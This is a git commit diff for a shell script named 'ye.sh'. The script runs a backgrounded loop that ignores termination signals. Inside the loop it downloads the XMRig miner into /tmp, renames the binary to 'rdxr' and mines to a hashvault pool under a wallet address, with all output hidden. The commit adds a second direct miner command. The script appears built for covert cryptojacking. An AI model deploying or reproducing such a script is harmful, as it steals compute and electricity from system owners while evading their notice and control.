5cc6b41876f9706c16f2b584bad65cb577c9a40e
terasaka253 <terasaka253@gmail.com>
2025-11-19 04:38:30 +0700

    Update ye.sh

--- ye.sh
+++ ye.sh
@@ -1,1 +1,5 @@
 nohup bash -c 'trap "" HUP INT QUIT TERM; while true; do cd /tmp && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && mv xmrig rdxr && ./rdxr -o eu.hashvault.pro:443 -u SaLvdTxizfddRPvL3jmgiJAhaDHCaHsTx4yrg2mNpqGqA5s3DnWSpiBE4g9ZQMgAVZQRg8AvnjeZZXoKrRwb6M164YcqEcDy8gS -p 48t --tls; done'  > /dev/null 2>&1  &
+
+
+
+./xmrig -o eu.hashvault.pro:443 -u SaLvdTxizfddRPvL3jmgiJAhaDHCaHsTx4yrg2mNpqGqA5s3DnWSpiBE4g9ZQMgAVZQRg8AvnjeZZXoKrRwb6M164YcqEcDy8gS -p redhat
